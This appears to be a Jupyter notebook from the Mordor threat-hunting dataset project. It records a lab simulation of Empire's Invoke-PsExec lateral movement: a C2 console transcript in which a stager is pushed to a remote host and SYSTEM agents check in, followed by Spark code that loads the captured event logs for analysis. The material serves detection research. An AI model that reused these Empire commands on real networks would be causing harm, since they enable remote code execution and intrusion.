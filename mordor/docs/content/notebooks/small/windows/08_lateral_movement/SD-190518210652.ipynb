{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Invoke PsExec"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518210652 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 19/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_psexec.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries executing malicious code remotely psexec style"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_psexec\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > \n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > info\n",
    "\n",
    "              Name: Invoke-PsExec\n",
    "            Module: powershell/lateral_movement/invoke_psexec\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Executes a stager on remote hosts using PsExec type\n",
    "  functionality.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/rapid7/metasploit-\n",
    "  framework/blob/master/tools/psexec.rb\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name         Required    Value                     Description\n",
    "  ----         --------    -------                   -----------\n",
    "  Listener     False                                 Listener to use.                        \n",
    "  ProxyCreds   False       default                   Proxy credentials                       \n",
    "                                                    ([domain\\]username:password) to use for \n",
    "                                                    request (default, none, or other).      \n",
    "  ComputerName True                                  Host[s] to execute the stager on, comma \n",
    "                                                    separated.                              \n",
    "  ServiceName  True        Updater                   The name of the service to create.      \n",
    "  Command      False                                 Custom command to execute on remote     \n",
    "                                                    hosts.                                  \n",
    "  Proxy        False       default                   Proxy to use for request (default, none,\n",
    "                                                    or other).                              \n",
    "  UserAgent    False       default                   User-agent string to use for the staging\n",
    "                                                    request (default, none, or other).      \n",
    "  Agent        True        V6W3TH8Y                  Agent to run module on.                 \n",
    "  ResultFile   False                                 Name of the file to write the results to\n",
    "                                                    on agent machine.                       \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > set Listener https\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > set ComputerName IT001.shire.com\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked V6W3TH8Y to run TASK_CMD_JOB\n",
    "[*] Agent V6W3TH8Y tasked with task ID 2\n",
    "[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_psexec\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > Job started: 9GY4PC\n",
    "[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103\n",
    "[*] New agent EXBNZYTS checked in\n",
    "[+] Initial agent EXBNZYTS from 10.0.10.103 now active (Slack)\n",
    "[*] Sending agent (stage 2) to EXBNZYTS at 10.0.10.103\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > \n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "H3DKB8SA ps 172.18.39.106   HR001             SHIRE\\nmartha           powershell         5172   5/0.0    2019-05-18 21:07:43  https           \n",
    "TKV35P8X ps 172.18.39.106   HR001             *SHIRE\\nmartha          powershell         5452   5/0.0    2019-05-18 21:07:42  https           \n",
    "EMDBFPSY ps 172.18.39.106   HR001             SHIRE\\nmartha           notepad            7924   5/0.0    2019-05-18 21:07:44  https           \n",
    "\n",
    "V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\\pgustavo          powershell         5204   5/0.0    2019-05-18 21:07:42  https           \n",
    "XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:07:43  https           \n",
    "EXBNZYTS ps 172.18.39.105   IT001             *SHIRE\\SYSTEM           powershell         6728   5/0.0    2019-05-18 21:07:42  https           \n",
    "\n",
    "\n",
    "(Empire: agents) >  \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_psexec.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
